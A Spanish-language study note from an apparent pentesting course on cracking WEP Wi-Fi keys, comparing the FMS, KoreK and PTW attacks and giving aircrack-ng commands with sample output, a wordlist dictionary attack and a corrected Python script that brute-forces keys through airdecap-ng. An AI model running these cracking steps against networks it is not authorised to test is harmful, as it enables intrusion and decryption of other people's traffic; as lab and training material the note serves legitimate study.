---
tags:
  - Wi-Fi/WEP
  - Seguridad/Contraseñas
  - Pentesting/Explotacion
Descripción: "Los tres métodos estadísticos de recuperación de clave, cuántos IVs necesita cada uno y el ataque por diccionario cuando no hay suficientes"
Fecha de actualización: 2026-08-01
Nota previa: "[[09 - Atacar un AP WEP sin clientes]]"
Nota siguiente: "[[11 - Detección y evasión de ataques WEP]]"
Area: "[[WEP.base|WEP]]"
---
---

<mark style="background: #ADCCFFA6;">Recuperar una clave WEP no es fuerza bruta: es **criptoanálisis estadístico**</mark>. Cada IV capturado es una observación sobre la misma clave fija, y con suficientes observaciones cada byte queda determinado con alta probabilidad. Por eso la métrica es el número de IVs y no el tamaño de la clave.

# Los tres métodos

| Método | Año | IVs para 40 bits | IVs para 104 bits |
| ------ | --- | ---------------- | ----------------- |
| **FMS** | 2001 | ~500.000 | Millones |
| **KoreK** | 2004 | 250.000+ | 1.500.000+ |
| **PTW** | 2007 | **~20.000** | **~40.000** |

**FMS** (Fluhrer, Mantin y Shamir) fue el primero: explota que ciertos IVs —los llamados *débiles*— filtran información sobre el primer byte del keystream, y con él sobre la clave. Los fabricantes respondieron filtrando esos IVs, lo que lo dejó parcialmente obsoleto.

**KoreK** generalizó el enfoque con 17 correlaciones estadísticas distintas, muchas de las cuales no dependen de IVs débiles. Sobrevivió al filtrado, a costa de necesitar mucho volumen.

**PTW** (Pyshkin, Tews y Weinmann, [ePrint 2007/120](https://eprint.iacr.org/2007/120.pdf)) es el que hace de WEP un problema de minutos. Aprovecha la estructura conocida de los paquetes **ARP** para atacar todos los bytes de la clave a la vez, en lugar de secuencialmente. <mark style="background: #FFB86CA6;">Baja el requisito de cientos de miles de IVs a unas decenas de miles</mark> — de horas a minutos.

# Usarlos

**PTW es el método por defecto** desde `aircrack-ng` 1.0. No hay que pedirlo:

```shell-session
$ aircrack-ng -b B2:D1:AC:E1:21:D1 WEP-01.cap

Read 195576 packets.
Got 97822 out of 95000 IVs
Starting PTW attack with 97822 IVs.
KEY FOUND! [ 33:44:55:22:11 ]
Decrypted correctly: 100%
```

Para KoreK/FMS hay que pedirlo explícitamente con `-K`:

```shell-session
$ aircrack-ng -K HTB.ivs

[00:00:17] Tested 1741 keys (got 566693 IVs)

   KB   depth  byte(vote)
    0   0/  1  AB( 50) 11( 20) 71( 20) 0D( 12) 10( 12)
    1   1/  2  C7( 31) BD( 18) F8( 17) E6( 16) 35( 15)

KEY FOUND! [ AB:C7:7F:3A:03:D0:AF:DA:F6:8D:A5:E2:C7 ]
```

Cada fila es un byte de la clave: `depth` indica cuántos candidatos se están explorando —`0/ 1` es certeza, `1/ 2` ambigüedad— y los votos entre paréntesis miden el peso estadístico.

> [!warning]+ Cuándo usar `-K`, y cuándo no
> <mark style="background: #FF5582A6;">PTW necesita **paquetes ARP** en la captura</mark>; si el tráfico capturado no los contiene, falla aunque haya IVs de sobra. Ése es el caso en que `-K` sirve: KoreK acepta cualquier IV. También hace falta para claves de 152 o 256 bits, fuera del estándar. En cualquier otro escenario, `-K` sólo multiplica por diez el volumen necesario — y es el fallo que comete el módulo 222 al usarlo sin explicar por qué.

# Ataque por diccionario

Cuando no hay IVs suficientes —una captura corta, una red casi sin tráfico— queda otra vía: muchas claves WEP se generan a partir de una palabra ASCII. Una clave de 40 bits son 5 caracteres; una de 104, 13.

`aircrack-ng` soporta diccionario de forma nativa:

```shell-session
$ aircrack-ng -a 1 -w /usr/share/wordlists/rockyou.txt WEP-01.cap
```

| Opción | Función |
| ------ | ------- |
| `-a 1` | Forzar modo WEP |
| `-w` | Diccionario |
| `-c` | Sólo caracteres alfanuméricos |
| `-t` | Sólo BCD (*binary coded decimal*) |
| `-d <máscara>` | Fijar parte de la clave conocida |

Filtrar el diccionario a las longitudes válidas ahorra casi todo el trabajo:

```shell-session
$ awk 'length($0) == 5 || length($0) == 13' rockyou.txt > wep.txt
$ aircrack-ng -a 1 -w wep.txt WEP-01.cap
```

## El enfoque de HTB, y su problema

El módulo propone un script Python que recorre un diccionario invocando `airdecap-ng` por cada candidato y comprobando si descifra algo. La idea es correcta —**`airdecap-ng` como oráculo**: si descifra un solo paquete, la clave es buena— pero la implementación tiene dos defectos serios:

```python
# El script del módulo:
if int(output.split('\n')[5][-1]) > 0:
```

<mark style="background: #FF5582A6;">Ese `[-1]` toma **el último carácter** de la línea</mark>. Si `airdecap-ng` descifra 10 paquetes, la línea termina en `0` y la comprobación falla: **la clave correcta se descarta**. Sólo funciona por casualidad cuando el número de paquetes descifrados queda entre 1 y 9. Además depende de que el mensaje esté siempre en la línea 5.

Y lanzar un proceso por candidato limita el ritmo a unos cientos por segundo, frente a los miles de `aircrack-ng` nativo.

Una versión corregida, si se quiere el enfoque del oráculo:

```python
import re, subprocess, binascii

CAP = 'WEP-01.cap'

with open('wep.txt', encoding='utf-8', errors='ignore') as f:
    for linea in f:
        clave = linea.strip()
        if len(clave) not in (5, 13):
            continue
        hexkey = binascii.hexlify(clave.encode()).decode()
        salida = subprocess.run(
            ['airdecap-ng', '-w', hexkey, CAP],
            capture_output=True, text=True).stdout
        m = re.search(r'Number of decrypted WEP packets\s+(\d+)', salida)
        if m and int(m.group(1)) > 0:
            print(f'Clave encontrada: {clave}  (hex {hexkey})')
            break
```

La diferencia: se busca el número **por su etiqueta** con una expresión regular en lugar de por posición, y se convierte el valor completo. <mark style="background: #8000E1A6;">La lección general: nunca parsear salida de herramientas por índice de línea y de carácter</mark> — cambia con la versión y falla en silencio.

# Después de la clave

```shell-session
$ airdecap-ng -w 636865656b WEP-01.cap

Total number of packets read           9
Total number of WEP data packets       7
Number of decrypted WEP packets        7
```

Genera `WEP-01-dec.cap` con el tráfico en claro, listo para Wireshark. A diferencia de WPA2, <mark style="background: #FFB8EBA6;">en WEP **no hace falta ningún handshake** para descifrar</mark>: la clave es la misma para todos los clientes y todo el tráfico capturado, incluido el de antes de empezar la auditoría. Ver [[05 - Airdecap-ng]].

La clave se introduce en el gestor de red en hexadecimal y sin separadores: `3344552211`, `636865656b`.

# Rendimiento

| Escenario | Tiempo |
| --------- | ------ |
| PTW con 40.000 IVs, clave de 104 bits | Segundos |
| KoreK con 1,5 M de IVs | Minutos |
| Diccionario de 1 M de palabras filtrado | Segundos |
| Reunir los IVs con ARP replay | **1–3 minutos** |

<mark style="background: #FFB86CA6;">El cuello de botella nunca es el cracking: es la recolección</mark>. Por eso todo el módulo gira alrededor de generar IVs rápido, y por eso una clave WEP de 104 bits no es más segura que una de 40 — sólo necesita el doble de IVs, que se consiguen en el doble de nada.

Qué rastro deja todo esto es [[11 - Detección y evasión de ataques WEP]].
